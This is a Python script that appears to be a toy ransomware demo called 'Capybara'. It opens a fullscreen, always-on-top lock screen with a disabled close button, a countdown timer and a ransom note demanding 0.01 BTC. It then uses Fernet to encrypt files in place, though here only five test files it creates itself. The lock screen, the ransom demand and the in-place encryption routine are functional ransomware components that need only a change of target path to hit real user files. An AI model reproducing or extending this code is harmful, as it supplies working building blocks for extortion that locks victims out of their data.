import os
import time
import tkinter as tk
from PIL import Image, ImageTk
import threading
from cryptography.fernet import Fernet

# Global variables
payment_confirmed = False
encryption_status = ""


# Function to handle encryption of files
def encrypt_file(file_path, cipher, target_folder):
    global encryption_status
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted_data = cipher.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted_data)
        encryption_status = f"Encrypted: {file_path}"
        print(encryption_status)
        log_action(encryption_status, target_folder)
    except Exception as e:
        encryption_status = f"Error encrypting {file_path}: {e}"
        print(encryption_status)
        log_action(encryption_status, target_folder)


# Function to log actions
def log_action(message, target_folder):
    log_path = os.path.join(target_folder, "log.txt")
    with open(log_path, "a") as log_file:
        log_file.write(message + "\n")
    print(message)


# Lock screen function
def lock_screen():
    global payment_confirmed, encryption_status

    def update_timer():
        nonlocal remaining_time
        if remaining_time > 0:
            minutes, seconds = divmod(remaining_time, 60)
            timer_label.config(text=f"Time Remaining: {minutes:02}:{seconds:02}")
            remaining_time -= 1
            root.after(1000, update_timer)
        else:
            timer_label.config(text="Time's up! Pay the ransom!")
            root.destroy()  # Close the lock screen when the timer ends
            os._exit(0)  # Force program termination to prevent manual restart

    def update_encryption_status():
        if encryption_status:
            status_label.config(text=encryption_status)
        if not payment_confirmed:
            root.after(500, update_encryption_status)  # Check every 500ms

    def check_payment():
        if os.path.exists("PAYMENT_CONFIRMED.TXT"):
            global payment_confirmed
            payment_confirmed = True
            root.destroy()  # Close the lock screen
        else:
            root.after(5000, check_payment)  # Check every 5 seconds

    # Create the tkinter window
    root = tk.Tk()
    root.title("Capybara Lock Screen")
    root.attributes("-fullscreen", True)  # Fullscreen
    root.attributes("-topmost", True)  # Keep on top
    root.configure(bg="black")  # Background color

    # Load and display background image
    image = Image.open("capybara.jpg")  # Replace with your image file
    image = image.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.Resampling.LANCZOS)
    bg_image = ImageTk.PhotoImage(image)
    bg_label = tk.Label(root, image=bg_image)
    bg_label.place(x=0, y=0, relwidth=1, relheight=1)

    # Display ransom note text
    ransom_text = """
    Your files have been taken hostage by the mighty Capybara!
    To recover them, you must offer snacks (or Bitcoin).

    Send 0.01 BTC to the following address:
    1CapybaraBTCAddress1234567890
    """
    text_label = tk.Label(root, text=ransom_text, font=("Helvetica", 20), fg="white", bg="black", justify="center")
    text_label.pack(pady=20)

    # Add timer label
    remaining_time = 300  # Timer for 5 minutes
    timer_label = tk.Label(root, text="", font=("Helvetica", 24), fg="red", bg="black")
    timer_label.pack(pady=10)
    update_timer()

    # Add encryption status label
    status_label = tk.Label(root, text="", font=("Helvetica", 16), fg="yellow", bg="black", justify="center")
    status_label.pack(pady=20)
    update_encryption_status()

    # Check for payment confirmation
    check_payment()

    # Disable close button
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    root.mainloop()


# Main function
def main():
    global payment_confirmed

    # Start the lock screen in a separate thread
    lock_screen_thread = threading.Thread(target=lock_screen)
    lock_screen_thread.start()

    # Set up encryption environment
    target_folder = os.path.expanduser("~/Documents/Capybara_Target")
    if not os.path.exists(target_folder):
        os.makedirs(target_folder)

    key = Fernet.generate_key()
    cipher = Fernet(key)

    # Create ransom note
    ransom_note_path = os.path.join(target_folder, "README_CAPYBARA.TXT")
    with open(ransom_note_path, "w") as f:
        f.write(f"Your files have been encrypted!\nEncryption Key: {key.decode()}")
    print(f"Ransom note created at: {ransom_note_path}")

    # Simulate encryption process
    for i in range(1, 6):  # Encrypt 5 files
        if payment_confirmed:
            print("Payment confirmed. Stopping encryption...")
            break
        fake_file_path = os.path.join(target_folder, f"file{i}.txt")
        with open(fake_file_path, "w") as f:
            f.write(f"This is test file {i}.")
        encrypt_file(fake_file_path, cipher, target_folder)
        time.sleep(10)  # Simulate time taken to encrypt a file

    # Wait for the lock screen to close
    lock_screen_thread.join()

    if payment_confirmed:
        print("Decryption can now begin!")
    else:
        print("Ransom not paid. System remains locked.")


if __name__ == "__main__":
    main()
